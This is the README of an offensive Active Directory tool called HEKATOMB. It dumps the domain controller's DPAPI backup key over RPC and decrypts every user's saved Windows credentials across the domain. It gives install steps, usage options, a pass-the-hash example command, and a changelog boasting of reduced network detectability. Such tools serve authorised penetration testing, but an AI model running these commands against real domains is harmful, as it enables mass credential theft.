# The HEKATOMB project

<div align="center">
  <br>
  <img src="https://img.shields.io/badge/Python-3.6+-informational">
  <br>
  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>
  <br>
  <h1>
    Because Domain Admin rights are not enough.<br />
                Hack them all.
  </h1>
  <br><br>
</div>

> Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations.<br />
> Then it will download all DPAPI blob of all users from all computers.<br />
>	Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.<br />
> <br />
> Script kiddies code malwares in C#, real pentesters use Python and are already Domain Admins 🐍
> 
<br>
<div align="center">
<img src="https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png" width="80%;">
</div>
<br>


## Changelog
<br />
On last version (V 1.2.2) :
<br />
- Use of the ldap3 library instead of Impacket for LDAP requests<br />
- Fix a bug that prevented querying trusted domains via an external domain account with administrator rights on the trusted domain controller<br />
- Add -smb2 parameter to force the use of SMBv2 protocol when it is available<br />
- LDAP and SMB communications are now more difficult to detect on the network<br />
<br />
V 1.2.1 :<br />
- Add installation with Pypi<br />
<br />
V 1.2 :<br />
- Increase the LDAP results limit of users or computers extraction (1000 previously)<br />
- Add the possibility to specify a user or a computer to target<br />
- Add the possibility to export results to a CSV file<br />
<br />
V 1.1 :<br />
- Domain controller private key extraction through RPC<br />
- Credentials classification by computers and by users<br />

<br /><br />

## What da fuck is this ?
<br />
On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's Data Protection API and stored as "blob" files in user AppData folder.<br />
Outside of a domain, the user's password hash is used to encrypt these "blobs".<br />
When you are in an Active Directory environment, the Data Protection API uses the domain controller's public key to encrypt these blobs.<br />
With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the workstations in the domain.<br />
<br />
Hekatomb automates the search for blobs and the decryption to recover all domain users' secrets ☠️
<br />
<br />

## Installation
<br>
From Pypi :
<br><br>

```python
pip3 install hekatomb
```

<br>
From sources :
<br><br>

```python
git clone https://github.com/Processus-Thief/HEKATOMB
cd HEKATOMB
python3 setup.py install
```

<br><br>


## Usage
<br>
Hekatomb uses Impacket syntax :
<br><br>

```python
usage: hekatomb [-h] [-hashes LMHASH:NTHASH] [-pvk PVK] [-dns DNS] [-dnstcp] [-port [port]] [-just-user JUST_USER] [-just-computer JUST_COMPUTER] [-md5] [-debug] [-debugmax] target

Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address of DC>

options:
  -h, --help            Show this help message and exit

authentication:
  -hashes LMHASH:NTHASH     NTLM hashes, format is LMHASH:NTHASH

authentication:
  -pvk PVK                  Domain backup keys file
  -dns DNS                  DNS server IP address to resolve computers hostname
  -dnstcp                   Use TCP for DNS connection
  -port [port]              Port to connect to SMB Server
  -smb2                     Force the use of SMBv2 protocol
  -just-user [USERNAME]     Test only specified username
  -just-computer [COMPUTER] Test only specified computer
  -md5                      Print md5 hash insted of clear passwords

verbosity:
  -debug                Turn DEBUG output ON
  -debugmax             Turn DEBUG output TO MAAAAXXXX
```

<br>
<br>

## Example

<br>

```python
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
```

<br>
<br>
    
## How to retrieve domain backup keys ?

<br />
If no domain backup keys are provided, the script will retrieve it through RPC
